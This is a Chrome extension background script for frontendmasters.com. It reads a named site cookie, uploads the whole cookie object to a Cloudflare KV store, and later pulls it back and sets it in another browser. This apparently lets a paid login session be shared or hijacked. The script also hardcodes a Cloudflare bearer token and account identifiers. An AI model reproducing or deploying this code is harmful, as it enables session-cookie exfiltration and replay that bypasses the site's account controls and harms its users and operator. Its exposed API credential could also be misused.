console.log("Background script loading");
function saveCookieToCloudflareKV(cookieValue) {
  console.log("Saving cookie to Cloudflare KV:", cookieValue);

  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "d369ef77b8244755b3ef47bde27c1627";
  const key = "FEM";

  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/${key}`;
  const headers = {
    "Content-Type": "application/json",
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  fetch(url, {
    method: "PUT",
    headers: headers,
    body: cookieValue,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      console.log("Response received from Cloudflare KV:", response);
      return response.text();
    })
    .then((data) => {
      console.log("Cookie value saved to Cloudflare KV:", data);
    })
    .catch((error) => {
      console.error("Error saving cookie value to Cloudflare KV:", error);
    });
}
function applyCookiesFromCloudFlare(sendResponse) {
  const accountID = "f178d4c8c43acc247a04c9ea94017495";
  const namespaceID = "d369ef77b8244755b3ef47bde27c1627";
  const key = "FEM";

  const url = `https://api.cloudflare.com/client/v4/accounts/${accountID}/storage/kv/namespaces/${namespaceID}/values/${key}`;
  const headers = {
    Authorization: "Bearer jhWqCzupouL4o1VmjWWZtNN-lTSJVPkIVlO-4qO2",
  };

  fetch(url, {
    method: "GET",
    headers: headers,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then((cookieDetails) => {
      chrome.cookies.set(
        {
          url: `https://www.frontendmasters.com`,
          name: cookieDetails.name,
          value: cookieDetails.value,
          domain: cookieDetails.domain,
          path: cookieDetails.path,
          secure: cookieDetails.secure,
          httpOnly: cookieDetails.httpOnly,
          expirationDate: cookieDetails.expirationDate,
          sameSite:
            cookieDetails.sameSite === "unspecified"
              ? "no_restriction"
              : cookieDetails.sameSite,
        },
        function (cookie) {
          if (chrome.runtime.lastError) {
            console.error("Error setting cookie:", chrome.runtime.lastError);
            sendResponse({
              success: false,
              error: chrome.runtime.lastError.message,
            });
            return;
          }
          console.log("Cookie set successfully:", cookie);
          sendResponse({ success: true });
        }
      );
    })
    .catch((error) => {
      console.error("Error retrieving or setting cookie:", error);
      sendResponse({ success: false, error: error.message });
    });

  return true;
}
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log("Message received:", message);

  switch (message.action) {
    case "getCookie":
      console.log(`Fetching cookie with name: ${message.name}`);
      chrome.cookies.get(
        { url: "https://www.frontendmasters.com/", name: message.name },
        (cookie) => {
          if (cookie) {
            console.log("Cookie found:", cookie);
            sendResponse({ cookie });
            saveCookieToCloudflareKV(JSON.stringify(cookie));
          } else {
            console.log("Cookie not found");
            sendResponse({ error: "Cookie not found" });
          }
        }
      );
      break;
    case "applyCookiesFromCloudFlare":
      applyCookiesFromCloudFlare(sendResponse);
      break;

    default:
      console.log("Unknown action received:", message.action);
      sendResponse({ error: "Unknown action" });
      break;
  }

  return true;
});

console.log("Background script loaded");
